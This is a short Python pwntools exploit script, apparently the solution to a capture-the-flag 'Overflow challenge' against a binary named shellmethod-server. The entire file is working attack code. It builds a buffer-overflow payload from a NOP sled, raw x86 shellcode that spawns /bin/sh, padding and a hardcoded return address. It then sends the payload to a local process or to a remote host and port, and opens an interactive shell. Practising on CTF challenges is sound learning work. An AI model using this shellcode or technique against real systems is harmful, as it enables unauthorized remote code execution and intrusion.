#! /usr/bin/env python3
##
# Created for the Overflow challenge
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
import sys
from pwn import *

# Get buffer addresss from GDB
elf = ELF("../service/shellmethod-server")
buf = p32(0x804b008)
shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
payload = (b"\x90" * (64 - len(shellcode))) + shellcode + (b"\x41" * 4) + buf

# Start binary in pipe or connect to socket
if len(sys.argv) == 3:
    t = remote(sys.argv[1], int(sys.argv[2]))
else:
    t = process("../service/shellmethod-server")

# Send payload and dump initial output
t.recvuntil("Your response? ")
t.sendline(payload)

# launch shell
t.interactive()
